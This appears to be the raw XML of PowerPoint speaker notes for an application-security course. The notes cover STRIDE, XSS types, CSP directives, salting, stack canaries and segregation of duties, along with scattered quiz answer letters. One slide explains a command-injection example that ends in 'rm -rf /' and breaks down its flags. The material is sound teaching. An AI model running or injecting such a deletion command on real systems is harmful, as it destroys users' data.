        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42074210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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Sprint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is a short, fixed-length time period (usually </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>1–4 weeks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) during which an Agile team works to complete a specific set of tasks or features from the product backlog.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Supply chain vulnerabilities are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>weaknesses or risks introduced into an organization's systems</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> through</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> third-party vendors, suppliers, or partners.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8638996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IN" b="1" dirty="0"/>
              <a:t>Cutover covers final testing, user training, and system support to ensure a smooth transition to the live environment</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28879327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978272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a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28274043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a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7234650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97808-2C0D-3B36-A6E7-A5C0349800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87004D-FD39-7BB4-D8BB-6A6A403B6C4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0907304-8147-3EF0-9E17-8A5614A30A3A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>B</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37632898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557CE-3E49-51E7-171E-8090C43C00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00C1E6-3CD5-0409-B44B-D6D931C2EA2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381F0C6-C203-522A-98A5-0D0A652BC635}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>C</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18026844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Secure Data Transmission ensures: Confidentiality, Integrity, and Authentication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: The user logs in using credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Authorization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: The system checks if the user has permission to access specific features or data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Show </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>generic error messages</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to users while logging detailed technical errors for developers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Regenerate Session IDs, Set Session Expiry, Store Minimal Sensitive Data, Encrypt, Limit Cookie Scope(subdomain/path)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10541190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Patch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = “Fix this small issue now.”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Update</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = “Bring my current version up to date with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>minor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> improvements.”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Upgrade</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = “Move to a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>whole new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>version.”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32682708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b="1" dirty="0"/>
              <a:t>Physical separation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Different teams or individuals work in separate secure areas, or use physically distinct systems for different tasks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="158750" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Logical separation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Access rights and permissions are segmented so that no single person has full control over all parts of the system.</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1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Retention of key personnel/knowledge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Ensuring that critical expertise and system knowledge stays within the organization</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18587892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b="1" dirty="0"/>
              <a:t>Access Control: Authentication, Authorization (role-based access control, least privilege). Accountability (logging, monitoring user actions).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="158750" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Transaction controls: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0"/>
              <a:t>E</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>nsuring that financial or critical transactions are processed securely, accurately, and completely.</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1" dirty="0"/>
              <a:t>Mobile code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>= software transmitted over networks and executed on a client (e.g., JavaScript, ActiveX, Java applets).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="158750" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37068548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STRIDE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (by Microsoft):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>S</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>poofing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ampering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>epudiation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>nformation disclosure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>D</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>enial of Service</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>E</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>levation of Privilege</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28586210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Calling </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>APIs over HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, Not using authentication or authorization for API requests.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A CI/CD pipeline is an automated workflow that streamlines the software development process by integrating </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>continuous integration (CI) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>continuous delivery (CD) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>or continuous deployment</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42046383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B</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27108133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a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33937091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a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33565329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D</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36662564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a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22534858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B</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2281949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B</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34719532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2170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Whitelist Validation: For example, allow only alphanumeric characters in usernames.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Blacklist Validation: Note that this method is less secure as it can miss new or unforeseen malicious inputs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2513215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452481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Command injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36580143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b="1" dirty="0"/>
              <a:t>verbose</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> : using or containing more words than are needed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19565025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Verbose errors </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>are error messages that contain a significant amount of detailed information about an application's or system's internal workings when an error occurs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5954709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469586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dirty="0"/>
              <a:t>default-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> 'self' - Load resources from same domain, protocol, and port.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> 'self' https://apis.google.com: This directive applies specifically to JavaScript files or inline script execution.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>style-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> 'self' 'unsafe-inline':  It allows styles only from: 'self' → same origin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>'unsafe-inline' → inline CSS inside &lt;style&gt; tags or style="" attributes is allowed.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25275635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 Transit: Use TLS (Transport Layer Security) or SSL (Secure Sockets Layer) to encrypt data being transmitted over networks, including the internet. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Audit Trails: Keep logs of who accesses sensitive data and when, to detect unauthorized access or potential breaches.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35349657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5838805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b="1" dirty="0"/>
              <a:t>Stored XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Script saved on the server (persistent).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Reflected XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Script comes from user input/URL and reflected back (non-persistent).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>DOM-Based XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Vulnerability in client-side JavaScript (browser executes it directly).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Document Object Model (DOM): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The Document Object Model (DOM) is a programming interface for web documents. It represents the structure of a document as a tree of objects, where each object corresponds to a part of the document.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="304442984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667924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Arbitrary code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> refers to any code chosen by an attacker that can be executed on a target system due to a vulnerability, often leading to unauthorized actions.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19166594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Canaries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> are special guard values placed on the stack to detect and prevent buffer overflow attacks before overwriting return addresses.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41255103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The command pings your own machine (127.0.0.1) and, if successful, tries to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>delete all files on the system</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>rm -rf /</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>rm → remove files.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-r → recursive (delete directories and their contents).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-f → force (ignore warnings and errors).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/ → the root directory (top of the entire filesystem).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16225748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Salt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = a random string added to the password before hashing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Purpose: Ensure that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>even if two users have the same password, their hashes are different</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Rainbow Tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> pre-computed hash databases to quickly find original passwords</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="142144595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75221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Salt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = a random string added to the password before hashing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Purpose: Ensure that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>even if two users have the same password, their hashes are different</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Rainbow Tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> pre-computed hash databases to quickly find original passwords</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="142144595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IN" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> rewriting solutions:  transform dynamic, user-unfriendly URLs into static, user-friendly, and SEO-friendly formats.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="158750" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>    User-Friendly URL (what the user sees in the browser):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="158750" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>    https://example.com/products/42/super-cool-gadget</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="158750" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>    Server-Side URL (what the server actually needs to process):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="158750" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>    https://example.com/product.php?id=42&amp;name=super-cool-gadget</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="191100012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1" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>Lateral movement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> is the technique attackers use, after gaining an initial foothold in a network, to progressively explore, expand their access, and move deeper into the system in search of high-value targets.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="260369519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Segregation of Duties (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SoD</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) is an internal control that divides a single task into multiple steps, requiring more than one person to complete it, thereby preventing fraud, error, and misuse of assets by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>ensuring no single individual has complete control over a critical process. </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21672980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err="1"/>
